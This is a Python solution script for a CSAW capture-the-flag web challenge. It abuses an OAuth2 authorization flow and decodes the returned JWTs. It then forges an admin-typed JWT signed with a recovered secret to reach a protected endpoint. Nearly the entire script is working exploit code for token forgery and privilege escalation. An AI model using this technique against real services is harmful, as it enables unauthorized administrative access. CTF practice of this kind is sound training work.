import sys
import jwt
import time
import json
# https://github.com/LyleMi/Saker
from Saker.main import Saker


class Cli(Saker):

    def __init__(self, url):
        super(Cli, self).__init__(url)

    def authorize(self, cid):
        data = {
            "response_type": "code",
            "client_id": cid,
            "redirect_uri": "token",
            "state": "ok"
        }
        self.post("oauth2/authorize", data=data)
        return self.lastr.url

    def token(self, cid, code):
        data = {
            "code": code,
            "grant_type": "authorization_code",
            "client_id": cid,
            "redirect_uri": "token",
            "state": "ok"
        }
        self.post("oauth2/token", data=data)
        return self.lastr.content

    def protected(self, token):
        headers = {
            "Authorization": "Bearer " + token,
        }
        self.get("protected", headers=headers)
        print(self.lastr.content)


if __name__ == '__main__':
    url = "http://web.chal.csaw.io:9000/"  # site url
    c = Cli(url)
    cid = "admin"
    step = sys.argv[1]
    if step == "1":
        code = c.authorize(cid).split("code=")[1].split("&")[0]
        print(code.split(".")[1].decode("base64"))
        token = json.loads(c.token(cid, code))["token"]
        payload = token.split(".")[1]
        payload = payload + '=' * (4 - len(payload) % 4)
        print(payload.decode("base64"))
    elif step == "2":
        key = "ufoundme!"
        payload = {
            "type": "admin",
            "secret": "ufoundme!",
            "iat": int(time.time()),
            "exp": int(time.time()) + 600
        }
        token = jwt.encode(payload, key)
        c.protected(token)